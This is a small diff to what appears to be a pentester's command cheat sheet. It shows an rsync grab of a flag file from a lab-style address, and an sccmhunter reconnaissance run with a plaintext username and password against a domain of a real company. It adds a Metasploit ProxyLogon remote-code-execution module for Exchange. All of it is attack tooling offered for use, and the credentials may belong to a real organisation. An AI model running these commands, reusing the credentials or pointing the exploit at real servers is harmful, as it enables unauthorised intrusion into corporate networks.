@@ -1641,3 +1641,6 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 	pipx install git+https://github.com/garrettfoster13/sccmhunter/
 	sccmhunter.py find -u adm.azukovskiy -p 'Apolon12!@' -d kuban.gazprom.ru -dc-ip 10.12.112.4 -debug
+
+# Proxylogon
+	exploit(windows/http/exchange_proxylogon_rce)
